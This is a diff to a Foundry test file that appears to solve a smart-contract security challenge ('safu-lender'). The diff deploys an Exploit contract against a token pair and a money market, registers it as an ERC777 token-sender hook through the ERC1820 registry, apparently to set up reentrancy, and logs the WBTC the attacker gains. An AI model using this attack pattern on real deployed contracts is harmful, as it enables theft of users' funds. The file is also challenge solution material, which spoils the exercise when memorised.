@@ -13,6 +13,7 @@ import {Token} from "src/other/Token.sol";
 import {Token777} from "src/other/Token777.sol";
 import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";
 import {IMoneyMarket} from "src/safu-lender/IMoneyMarket.sol";
+import {Exploit} from "src/safu-lender/Exploit.sol";
 
 
 contract Testing is Test {
@@ -119,6 +120,14 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit exp = new Exploit(
+            address(usdcBtcPair), 
+            address(wbtc), 
+            address(moneyMarket)
+        );
+        erc1820Registry.updateERC165Cache(address(exp), bytes4(keccak256("ERC777TokensSender")));
+        exp.start();
+        emit log_named_decimal_uint("wbtc=", wbtc.balanceOf(attacker), 18);
 
         vm.stopPrank();
         validation();
